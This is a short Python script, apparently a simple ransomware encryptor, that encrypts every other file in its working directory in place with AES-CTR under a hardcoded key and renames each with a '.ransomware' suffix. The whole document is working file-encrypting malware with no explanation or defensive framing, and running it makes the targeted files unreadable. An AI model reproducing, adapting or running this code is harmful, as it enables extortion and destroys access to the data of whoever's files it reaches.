import os
import pyaes

for name in os.listdir("./"):
    if name != "decrypt.py" and name != "encrypt.py":
        with open(name, "rb") as file:
            file_data = file.read()

        key = b"secretencryptkey"
        aes = pyaes.AESModeOfOperationCTR(key)

        data_encrypt = aes.encrypt(file_data)

        with open(name, "wb") as file:
            file.write(data_encrypt)

        os.rename("./{}".format(name), "./{}.ransomware".format(name))
